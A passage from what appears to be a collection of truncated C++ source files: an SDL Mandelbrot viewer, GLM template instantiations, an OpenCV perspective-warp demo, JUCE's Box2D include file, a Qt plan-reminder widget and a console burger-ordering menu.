CurrentSpawnTime = 1;\n\t}\n}\n",
    "/*\r\nZaine Rehman\r\n1-3-2024 through 2-22-2024\r\n\r\nThe previous program worked but had very messy code\r\nI also want to implement SIMD and possibly multithreading\r\nAnd just make it better in general\r\n\r\nHAHA NEVERMIND IT IS NOW MANDELBROT\r\n*/\r\n\r\n#include <iostream>\r\n#include <thread>\r\n#include <chrono>\r\n#include <cmath>\r\n\r\n#include <SDL.h>\r\n#undef main // needed or else it breaks\r\n\r\n#ifdef __SSE2__\r\n\t#include <emmintrin.h>\r\n#else\r\n\t#error SSE2 not supported; speed will be limited\r\n#endif\r\n\r\n#ifdef __AVX__\r\n\t#include <immintrin.h>\r\n#else\r\n\t#warning AVX not supported; speed will be limited\r\n#endif\r\n\r\n#include \"specifications.hpp\"\r\n#include \"extras.hpp\"\r\n\r\nusing namespace ball;\r\n\r\nusing std::chrono::high_resolution_clock;\r\nusing std::chrono::duration_cast;\r\nusing std::chrono::duration;\r\n\r\nvoid doMandel(\r\n\tdouble startX, double startY, \r\n\tdouble endX, double endY, \r\n\tbool doEasy\r\n) {\r\n\tfor (uint32_t i = startX; i < endX; i += 1) {\r\n\t\tfor (uint32_t j = startY; j < endY; j += 1) {\r\n\t\t\tif (doEasy && (lastMandel[i][j] < fastRenderVal)) continue;\r\n\r\n\t\t\tdouble cr = mapToReal(j,SCREENWIDTH,-currentZoomFactor,currentZoomFactor);\r\n\t\t\tdouble ci = mapToImaginary(i,SCREENHEIGHT,-currentZoomFactor,currentZoomFactor);\r\n\r\n\t\t\tuint32_t n = findMandelbrot(screenCenter[0]+cr,screenCenter[1]+ci,maxIter);\r\n\r\n\t\t\tRGBA_t color {0,0,0,255};\r\n\r\n\t\t\tswitch (colorMethod) {\r\n\t\t\tcase 0:\r\n\t\t\t\tif (n < maxIter)\r\n\t\t\t\t\tcolor = HSVtoRGB(n/(maxIter/1.0) * 360, 100, 100);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 1:\r\n\t\t\t\tcolor.R = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.G = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.B = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tcolor.R = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.G = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.B = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t\r\n\r\n\t\t\t//uint8_t r = (uint8_t)((n/maxIter) * 255);\r\n\t\t\t//uint8_t g = (uint8_t)((n/maxIter) * 255);\r\n\t\t\t//uint8_t b = (uint8_t)((n/maxIter) * 255);\r\n\r\n\t\t\tPIXELS[i][j] = color;\r\n\t\t\tlastMandel[i][j] = n;\r\n\t\t}\r\n\t\t//if(i == SCREENHEIGHT / 2) break;\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tsrand(time(0));\r\n\r\n\t// initialize SDL\r\n\tif(SDL_Init(SDL_INIT_VIDEO) < 0) {\r\n\t\t// honestly no idea why you would even get here\r\n\t\tstd::cout << \"SDL could not initialize! SDL_Error: \" << SDL_GetError() << std::endl;\r\n\t\treturn -1;\r\n\t}\r\n\tSDL_CreateWindowAndRenderer(SCREENWIDTH, SCREENHEIGHT, SDL_WINDOW_RESIZABLE, &WINDOW, &RENDERER);\r\n\tif (WINDOW == NULL) {\r\n\t\tstd::cout << \"Window could not be created! SDL_Error: \" << SDL_GetError() << std::endl;\r\n\t\treturn -1;\r\n\t}\r\n\tSURFACE = SDL_GetWindowSurface(WINDOW);\r\n\t\r\n\tSDL_SetWindowTitle(WINDOW,\"Mandelbrot\");\r\n\t//SDL_SetRenderDrawColor(RENDERER, 0, 0, 0, 0);\r\n\t//SDL_RenderClear(RENDERER);\r\n\r\n\t//SDL_SetSurfaceRLE(SURFACE,1);\r\n\r\n\tSDL_Event event;\r\n\tNeeded pixelRenderer {};\r\n\tclock_t timeNew = clock();\r\n\tclock_t timeOld = clock();\r\n\tdouble deltaTime = 0;\r\n\tuint32_t mouseX = 0, mouseY = 0;\r\n\tbool QUIT = false;\r\n\tbool newCalc = true;\r\n\tbool doEasy = false;\r\n\r\n\t/*\r\n\tSDL_SetRenderDrawColor(RENDERER,R,B,G,A);\r\n\tSDL_RenderDrawPoint(RENDERER,X,Y); // maybe i dont have to use this\r\n\tSDL_RenderPresent(R_RENDERER); // or this\r\n\tSDL_RenderClear(R_RENDERER);\r\n\t*/\r\n\t\r\n\twhile (!QUIT) {\r\n\t\t//SDL_RenderClear(RENDERER);\r\n\t\ttimeNew = clock();\r\n\t\tdeltaTime = timeNew - timeOld;\r\n\r\n\t\tSDL_PollEvent(&event);\r\n\t\tswitch (event.type) {\r\n\t\tcase SDL_QUIT:\r\n\t\t\tQUIT = true;\r\n\t\t\tbreak;\r\n\t\tcase SDL_KEYDOWN:\r\n\t\t\tswitch (event.key.keysym.sym) {\r\n\t\t\tcase SDLK_ESCAPE:\r\n\t\t\t\tQUIT = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_KP_1: // rainbow colored\r\n\t\t\t\tcolorMethod = 0;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tdoEasy = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_KP_2: // grayscale\r\n\t\t\t\tcolorMethod = 1;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tdoEasy = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_LEFT:\r\n\t\t\t\tscreenCenter[0] -= .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_RIGHT:\r\n\t\t\t\tscreenCenter[0] += .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_UP:\r\n\t\t\t\tscreenCenter[1] -= .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_DOWN:\r\n\t\t\t\tscreenCenter[1] += .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_KP_PERIOD:\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tdoEasy = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_KP_0:\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_KP_MULTIPLY:\r\n\t\t\t\tmaxIter *= 1.5;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_KP_DIVIDE:\r\n\t\t\t\tmaxIter /= 1.5;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t//default: break;\r\n\r\n\t\tcase SDL_MOUSEBUTTONDOWN: break;\r\n\t\t\tif (event.button.button == SDL_BUTTON_LEFT) {\r\n\t\t\t\tscreenCenter[0] = event.motion.x;\r\n\t\t\t\tscreenCenter[1] = event.motion.y;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase SDL_MOUSEWHEEL:\r\n\t\t\tif (event.wheel.y > 0) {\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tcurrentZoomFactor *= .8;\r\n\t\t\t\tmaxIter += 1;\r\n\t\t\t} else {\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tcurrentZoomFactor /= .8;\r\n\t\t\t\tmaxIter -= 1;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tstd::cout \r\n\t\t\t\t<< '[' << mouseX << ',' << mouseY << ']'\r\n\t\t\t\t<< \": value=\" << lastMandel[mouseY][mouseX]\r\n\t\t\t\t<<'\\n';\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t\r\n\t\tif (SDL_MUSTLOCK(SURFACE)) SD",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include \"opencv2/opencv.hpp\"\n#include <iostream>\n\nusing namespace cv;\nusing namespace std;\n\nvoid on_mouse_warp(int event, int x, int y, int flags, void* userdata);\n\nMat src;\nvector<Point2f> srcQuad(4);\nint cnt = 0;\n\nint main(void)\n{\n    while (true)\n    {\n        src = imread(\"img/card.bmp\");\n\n        if (src.empty())\n        {\n            cerr << \"Image load failed!\" << endl;\n            return -1;\n        }\n\n        namedWindow(\"src\");\n        setMouseCallback(\"src\", on_mouse_warp);\n        imshow(\"src\", src);\n\n        int key = waitKey(0);\n\n        if (key == 'c' || key == 'C')\n        {\n            destroyAllWindows();\n\n            Mat src_copy_point = src.clone();\n            imshow(\"src\", src_copy_point);\n\n            cnt = 0;\n\n            continue;\n        }\n        else\n        {\n            break;\n        }\n    }\n\n    return 0;\n}\n\nvoid on_mouse_warp(int event, int x, int y, int flags, void*)\n{\n    static Mat src_copy = src.clone();\n\n    if (event == EVENT_LBUTTONDOWN)\n    {\n        if (cnt == 0)\n        {\n            src_copy = src.clone();\n        }\n\n        if (cnt < 4)\n        {\n            srcQuad[cnt++] = Point2f(x, y);\n\n            circle(src_copy, Point(x, y), 5, Scalar(0, 0, 255), -1);\n            imshow(\"src\", src_copy);\n\n            if (cnt == 4)\n            {\n                for (int i = 0; i < srcQuad.size(); i++)\n                {\n                    cout << \"Point \" << i << \": (\" << srcQuad[i].x << \", \" << srcQuad[i].y << \")\" << endl;\n                }\n\n                int w = 200, h = 300;\n\n                vector<Point2f> dstQuad(4);\n                dstQuad[0] = Point2f(0, 0);\n                dstQuad[1] = Point2f(w - 1, 0);\n                dstQuad[2] = Point2f(w - 1, h - 1);\n                dstQuad[3] = Point2f(0, h - 1);\n\n                Mat pers = getPerspectiveTransform(srcQuad, dstQuad);\n\n                Mat dst;\n                warpPerspective(src, dst, pers, Size(w, h));\n\n                imshow(\"dst\", dst);\n            }\n        }\n    }\n}",
    "/*\r\n  ==============================================================================\r\n\r\n   This file is part of the JUCE library.\r\n   Copyright (c) 2022 - Raw Material Software Limited\r\n\r\n   JUCE is an open source library subject to commercial or open-source\r\n   licensing.\r\n\r\n   By using JUCE, you agree to the terms of both the JUCE 7 End-User License\r\n   Agreement and JUCE Privacy Policy.\r\n\r\n   End User License Agreement: www.juce.com/juce-7-licence\r\n   Privacy Policy: www.juce.com/juce-privacy-policy\r\n\r\n   Or: You may also use this code under the terms of the GPL v3 (see\r\n   www.gnu.org/licenses).\r\n\r\n   JUCE IS PROVIDED \"AS IS\" WITHOUT ANY WARRANTY, AND ALL WARRANTIES, WHETHER\r\n   EXPRESSED OR IMPLIED, INCLUDING MERCHANTABILITY AND FITNESS FOR PURPOSE, ARE\r\n   DISCLAIMED.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#ifdef JUCE_BOX2D_H_INCLUDED\r\n /* When you add this cpp file to your project, you mustn't include it in a file where you've\r\n    already included any other headers - just put it inside a file on its own, possibly with your config\r\n    flags preceding it, but don't include anything else. That also includes avoiding any automatic prefix\r\n    header files that the compiler may be using.\r\n */\r\n #error \"Incorrect use of JUCE cpp file\"\r\n#endif\r\n\r\n#include \"juce_box2d.h\"\r\n\r\nJUCE_BEGIN_IGNORE_WARNINGS_MSVC (6011)\r\nJUCE_BEGIN_IGNORE_WARNINGS_GCC_LIKE (\"-Wcast-align\",\r\n                                     \"-Wconversion\",\r\n                                     \"-Wfloat-conversion\",\r\n                                     \"-Wfloat-equal\",\r\n                                     \"-Wmaybe-uninitialized\",\r\n                                     \"-Wsign-conversion\",\r\n                                     \"-Wswitch-default\",\r\n                                     \"-Wswitch-enum\",\r\n                                     \"-Wunused-but-set-variable\",\r\n                                     \"-Wzero-as-null-pointer-constant\",\r\n                                     \"-Wsuggest-override\")\r\n\r\n#include <cstdarg>\r\n\r\nusing int8   = juce::int8;\r\nusing int16  = juce::int16;\r\nusing int32  = juce::int32;\r\nusing uint8  = juce::uint8;\r\nusing uint16 = juce::uint16;\r\nusing uint32 = juce::uint32;\r\n\r\n#include \"box2d/Collision/b2BroadPhase.cpp\"\r\n#include \"box2d/Collision/b2CollideCircle.cpp\"\r\n#include \"box2d/Collision/b2CollideEdge.cpp\"\r\n#include \"box2d/Collision/b2CollidePolygon.cpp\"\r\n#include \"box2d/Collision/b2Collision.cpp\"\r\n#include \"box2d/Collision/b2Distance.cpp\"\r\n#include \"box2d/Collision/b2DynamicTree.cpp\"\r\n#include \"box2d/Collision/b2TimeOfImpact.cpp\"\r\n#include \"box2d/Collision/Shapes/b2ChainShape.cpp\"\r\n#include \"box2d/Collision/Shapes/b2CircleShape.cpp\"\r\n#include \"box2d/Collision/Shapes/b2EdgeShape.cpp\"\r\n#include \"box2d/Collision/Shapes/b2PolygonShape.cpp\"\r\n#include \"box2d/Common/b2BlockAllocator.cpp\"\r\n#include \"box2d/Common/b2Draw.cpp\"\r\n#include \"box2d/Common/b2Math.cpp\"\r\n#include \"box2d/Common/b2Settings.cpp\"\r\n#include \"box2d/Common/b2StackAllocator.cpp\"\r\n#include \"box2d/Common/b2Timer.cpp\"\r\n#include \"box2d/Dynamics/b2Body.cpp\"\r\n#include \"box2d/Dynamics/b2ContactManager.cpp\"\r\n#include \"box2d/Dynamics/b2Fixture.cpp\"\r\n#include \"box2d/Dynamics/b2Island.cpp\"\r\n#include \"box2d/Dynamics/b2World.cpp\"\r\n#include \"box2d/Dynamics/b2WorldCallbacks.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2ChainAndCircleContact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2ChainAndPolygonContact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2CircleContact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2Contact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2ContactSolver.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2EdgeAndCircleContact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2EdgeAndPolygonContact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2PolygonAndCircleContact.cpp\"\r\n#include \"box2d/Dynamics/Contacts/b2PolygonContact.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2DistanceJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2FrictionJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2GearJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2Joint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2MouseJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2PrismaticJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2PulleyJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2RevoluteJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2RopeJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2WeldJoint.cpp\"\r\n#include \"box2d/Dynamics/Joints/b2WheelJoint.cpp\"\r\n#include \"box2d/Rope/b2Rope.cpp\"\r\n\r\n#include \"utils/juce_Box2DRenderer.cpp\"\r\n\r\nJUCE_END_IGNORE_WARNINGS_GCC_LIKE\r\nJUCE_END_IGNORE_WARNINGS_MSVC\r\n",
    "#include \"plan.h\"\n#include \"DATA/datauntil.h\"\n#include \"mzplanclientwin.h\"\n#include \"plandetail.h\"\n#include \"ui_plan.h\"\n\n#include <QMessageBox>\n\nQList<QString> Plan::statusStr={\"\u672a\u5f00\u59cb\",\"\u8fdb\u884c\u4e2d\",\"\u672a\u5b8c\u6210\",\"\u5df2\u5b8c\u6210\"};\n\nPlan::Plan(QString createdTime, QString startTime, QString reminderTime, QString endTime, QString content, QString rule,QDate date,QString completedTime, QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Plan)\n{\n    ui->setupUi(this);\n    init(createdTime,startTime,reminderTime,endTime,content,rule,date,completedTime);\n}\n\nPlan::Plan(Plan *plan, QDateTime completedTime,QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Plan)\n{\n    ui->setupUi(this);\n    init(plan->createdTime.toString(DTFORMAT),plan->startTime.toString(DTFORMAT),\n         plan->reminderTime.toString(DTFORMAT),plan->endTime.toString(DTFORMAT),plan->content,plan->rule,QDate(),completedTime.toString(DTFORMAT));\n}\n\nPlan::Plan(Plan *plan)\n    : QWidget(nullptr)\n    , ui(new Ui::Plan)\n{\n    //\u9664\u4e86parent\u5176\u4ed6\u503c\u90fd\u590d\u5236\u8fc7\u6765\n    this->createdTime=plan->createdTime;\n    this->startTime=plan->startTime;\n    this->reminderTime=plan->reminderTime;\n    this->endTime=plan->endTime;\n    this->completedTime=plan->completedTime;\n    this->rule=plan->rule;\n    this->content=plan->content;\n}\n\nPlan::~Plan()\n{\n    delete ui;\n}\n\nbool Plan::isConfirmRule(const QDate &date) const\n{\n    if(this->rule==\"once\")\n        return true;\n    //\u6709\u89c4\u5219\u7684\u8ba1\u5212 \u5224\u65ad\u662f\u5426\u7b26\u5408\u89c4\u5219\n    QList<QString> list=this->rule.split(\":\");\n    QString pre=list[0];\n    //\u53bb\u9664'[' ']'\n    QString suf=list[1].removeAt(0);\n    suf=suf.removeAt(suf.size()-1);\n    list=suf.split(\",\");\n    //\u5339\u914d\u6570\u5b57\n    if(pre==\"week\"){//\u6309\u5468\n        for(auto &number:list){\n            if(number.toInt()==date.dayOfWeek())\n                return true;\n            //\u5982\u679c\u662f\u8de8\u5929\u7684\uff0c\u8981\u770b\u9009\u62e9\u5929\u6570\u7684\u524d\u4e00\u5929\u662f\u5426\u5728\u89c4\u5219\u5185\n            if(this->endTime.date()>this->startTime.date()&&number.toInt()==date.addDays(-1).dayOfWeek())\n                return true;\n        }\n    }else{//\u6309\u6708\n        for(auto &number:list){\n            if(number.toInt()==date.day())\n                return true;\n            //\u5982\u679c\u662f\u8de8\u5929\u7684\uff0c\u8981\u770b\u9009\u62e9\u5929\u6570\u7684\u524d\u4e00\u5929\u662f\u5426\u5728\u89c4\u5219\u5185\n            if(this->endTime.date()>this->startTime.date()&&number.toInt()==date.addDays(-1).day())\n                return true;\n        }\n    }\n    return false;\n}\n\nvoid Plan::init(QString createdTime,QString startTime,QString reminderTime,QString endTime,\n                QString content,QString rule,QDate date,QString completedTime)\n{\n    if(completedTime!=nullptr){\n        this->completedTime=QDateTime::fromString(completedTime,DTFORMAT);\n        this->ui->finishTimeLabel->setText(completedTime);\n    }\n    //\u5b58\u50a8\u65e5\u671f\n    this->createdTime=QDateTime::fromString(createdTime,DTFORMAT);\n    this->content=content;\n    this->rule=rule;\n    //\u8be5\u8ba1\u5212\u662f\u4e00\u6b21\u6027\u7684\n    if(rule==\"once\"){\n        this->startTime=QDateTime::fromString(startTime,DTFORMAT);\n        this->endTime=QDateTime::fromString(endTime,DTFORMAT);\n        this->reminderTime=QDateTime::fromString(reminderTime,DTFORMAT);\n    }else{//\u975e\u4e00\u6b21\u6027\u7684\n        if(completedTime!=nullptr){//\u5df2\u5b8c\u6210\u7684\u8ba1\u5212\u8bb0\u5f55\uff0c\u6240\u6709\u5b57\u6bb5\u90fd\u662fDTFORMAT\n            this->startTime=QDateTime::fromString(startTime,DTFORMAT);\n            this->endTime=QDateTime::fromString(endTime,DTFORMAT);\n            this->reminderTime=QDateTime::fromString(reminderTime,DTFORMAT);\n        }else{\n            this->startTime=QDateTime::fromString(startTime,TFORMAT);\n            this->reminderTime=QDateTime::fromString(reminderTime,TFORMAT);\n            this->endTime=QDateTime::fromString(endTime,TFORMAT);\n            //\u6709\u89c4\u5219\u7684 \u628a\u65e5\u671f\u8bbe\u4e3a\u7528\u6237\u5f53\u524d\u9009\u62e9\u7684\u65e5\u671f\n            this->updateDate(date);\n        }\n    }\n    if(completedTime!=nullptr)\n        this->setDonePlanShow();\n    else\n        this->setPlanShow();\n}\n\nvoid Plan::updateDate(QDate date)\n{\n    //\u53ea\u6709\u6709\u89c4\u5219\u4e14\u672a\u5b8c\u6210\u7684\u8ba1\u5212\u624d\u4f1a\u8fdb\u5165\u8be5\u51fd\u6570\n    //\u5bf9\u4e8e\u8de8\u5929\u7684\u8ba1\u5212\u5982\u679c\u4e00\u6761\u8ba1\u5212\u7684\u5f00\u59cb\u65e5\u671f\u662f\u9009\u62e9\u7684\u65e5\u671f\uff0c\u5219\u7ee7\u7eed\u8fd0\u884c\n    //\u5982\u679c\u4e00\u6761\u8ba1\u5212\u7684\u5f00\u59cb\u65e5\u671f\u662f\u9009\u62e9\u65e5\u671f\u7684\u6628\u5929\uff0c\u4e5f\u5c31\u662f\u7ed3\u675f\u65e5\u671f\u662f\u4eca\u5929\uff0c\u5219today\u548ctomorrow\u8981\u51cf\u4e00\u5929\n\n    //\u628a\u65e5\u671f\u8bbe\u4e3a\u7528\u6237\u5f53\u524d\u9009\u62e9\u7684\u65e5\u671f\n    //\u5982\u679c\u63d0\u9192\u65e5\u671f\u7684\u65f6\u95f4\u6216\u7ed3\u675f\u65e5\u671f\u7684\u65f6\u95f4\u65e9\u4e8e\u5f00\u59cb\u65f6\u95f4\uff0c\u8bf4\u660e\u63d0\u9192\u548c\u7ed3\u675f\u662f\u7b2c\u4e8c\u5929 \u5219\u8bbe\u4e3a\u7b2c\u4e8c\u5929\n    QDate today=date;\n    QDate tomorrow=today.addDays(1);\n    //\u5224\u65adtoday\u662f\u4e0d\u662f\u5f00\u59cb\u65e5\u671f\n    this->startTime.setDate(today);\n    if(this->reminderTime.time()<this->startTime.time())\n        this->reminderTime.setDate(tomorrow);\n    else\n        this->reminderTime.setDate(today);\n    if(this->endTime.time()<this->startTime.time())\n        this->endTime.setDate(tomorrow);\n    else\n        this->endTime.setDate(today);\n}\n\nvoid Plan::setDonePlanShow()\n{\n    //\u5df2\u5b8c\u6210\u8ba1\u5212\u754c\u9762\u548c\u666e\u901a\u7684\u4e0d\u4e00\u6837\n    this->ui->finishBtn->setVisible(false);//\u53bb\u9664\u5b8c\u6210\u6309\u94ae\n    //\u6539\u4e3a\u672a\u5b8c\u6210\u6309\u94ae\n    //\u663e\u793a\u5b8c\u6210\u65f6\u95f4\n    this->ui->finishTimeLabel->setText(this->completedTime.toString(DTFORMAT));\n    this->ui->label->show();\n    this->ui->finishTimeLabel->show();\n    //\u7ec4\u4ef6\u663e\u793a\n    this->ui->beginTimeLabel->setText(this->startTime.toString(DTFORMAT));\n    this->ui->remindTimeLabel->setText(this->reminderTime.toString(DTFORMAT));\n    this->ui->endTimeLabel->setText(this->endTime.toString(DTFORMAT));\n    this->ui->content->setText(this->content);\n}\nvoid Plan::setPlanShow(){\n    this->ui->finishTimeLabel->setVisible(false);\n    this->ui->label->setVisible(false);\n    t",
    "#include <iostream>\n#include <iomanip>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct Sides {\n    string name;\n    double price;\n};\n\nstruct Order {\n    string size;\n    vector<Sides> Sides;\n    double totalPrice;\n\n    Order() : totalPrice(0.0) {} // Constructor to initialize totalPrice\n};\n\ndouble credits = 0.0;\nvector<Order> recentOrders;\n\nvoid displayMainMenu() {\n    cout << \"-------------------------------\" << endl;\n    cout << \"Our School Burger\" << endl;\n    cout << \"-------------------------------\" << endl;\n    cout << \"MAIN MENU\" << endl;\n    cout << \" 1. Add Credits (current credits = \" << fixed << setprecision(2) << credits << \")\\n\";\n    cout << \" 2. Order Burger\\n\";\n    cout << \" 3. Checkout\\n\";\n    cout << \" 4. Recent Orders\\n\";\n    cout << \" 0. Exit\\n\\n\";\n    cout << \"Please enter a number: \";\n}\n\nvoid addCredits() {\n    double amount;\n    cout << \"Enter the amount to add to your credits: \";\n    cin >> amount;\n    credits += amount;\n    cout << \"Your new balance = \" << fixed << setprecision(2) << credits << \" credits\\n\";\n}\n\nvoid orderBurger(Order& order) {\n    cout << \"\\nORDER Burger - Select Burger Flavor Option [Current Balance = \" << fixed << setprecision(2) << credits << \" credits]\\n\\n\";\n    cout << \"Please choose from the following options:\\n\";\n    cout << \" 1. Egg [5.0 credits]\\n\";\n    cout << \" 2. Fish [8.50 credits]\\n\";\n    cout << \" 3. Chicken [10.25 credits]\\n\";\n    cout << \" 0. Return to Main Menu\\n\";\n    cout << \"........................................\\n\";\n    cout << \"Please enter a number: \";\n\n    